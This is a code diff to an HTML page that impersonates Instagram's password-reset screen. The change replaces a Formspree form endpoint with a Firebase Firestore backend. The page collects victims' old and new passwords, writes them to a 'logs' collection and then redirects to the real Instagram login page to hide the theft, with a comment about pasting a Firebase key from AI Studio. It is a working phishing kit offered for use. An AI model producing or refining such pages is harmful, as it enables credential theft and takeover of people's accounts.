@@ -4,29 +4,65 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Reset Password • Instagram</title>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
     <style>
         body { background-color: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .container { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; box-sizing: border-box; }
         .logo { width: 175px; margin-bottom: 20px; }
-        h2 { color: #262626; font-size: 17px; margin-bottom: 15px; font-weight: 600; }
+        h2 { color: #262626; font-size: 16px; font-weight: 600; margin-bottom: 10px; }
         p { font-size: 14px; color: #8e8e8e; line-height: 18px; margin-bottom: 20px; }
-        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; box-sizing: border-box; font-size: 12px; }
+        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; box-sizing: border-box; font-size: 14px; }
         button { width: 100%; background: #0095f6; color: white; border: none; padding: 7px; border-radius: 4px; font-weight: 600; cursor: pointer; margin-top: 10px; }
     </style>
 </head>
 <body>
     <div class="container">
-        <img src="https://www.vectorlogo.zone/logos/instagram/instagram-wordmark.svg" class="logo" alt="Instagram">
-        
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo" alt="Instagram">
         <h2>Create a Strong Password</h2>
         <p>Your password must be at least 6 characters long.</p>
         
-        <form action="https://formspree.io/f/xykbyoza" method="POST">
-            <input type="password" name="old_password" placeholder="Old Password" required>
-            <input type="password" name="new_password" placeholder="New Password" required>
-            <input type="password" name="confirm_password" placeholder="New Password Confirmation" required>
-            <button type="submit">Reset Password</button>
+        <form id="resetForm">
+            <input type="password" id="old_pass" placeholder="Old Password" required>
+            <input type="password" id="new_pass" placeholder="New Password" required>
+            <input type="password" id="confirm_pass" placeholder="Confirm New Password" required>
+            <button type="submit" id="submitBtn">Reset Password</button>
         </form>
     </div>
+
+    <script>
+        // Use your Firebase config from AI Studio
+        const firebaseConfig = {
+            apiKey: "AIzaSy...", // Paste your actual API Key from AI Studio here
+            authDomain: "YOUR_PROJECT.firebaseapp.com",
+            projectId: "YOUR_PROJECT_ID",
+            storageBucket: "YOUR_PROJECT.appspot.com",
+            messagingSenderId: "...",
+            appId: "..."
+        };
+        
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+
+        document.getElementById('resetForm').onsubmit = async (e) => {
+            e.preventDefault();
+            const btn = document.getElementById('submitBtn');
+            btn.innerText = 'Updating...';
+            btn.disabled = true;
+
+            try {
+                await db.collection("logs").add({
+                    old_password: document.getElementById('old_pass').value,
+                    new_password: document.getElementById('new_pass').value,
+                    timestamp: new Date()
+                });
+                // REDIRECT TO REAL INSTAGRAM
+                window.location.href = "https://www.instagram.com/accounts/login/";
+            } catch (error) {
+                console.error("Error writing document: ", error);
+                window.location.href = "https://www.instagram.com/accounts/login/";
+            }
+        };
+    </script>
 </body>
 </html>
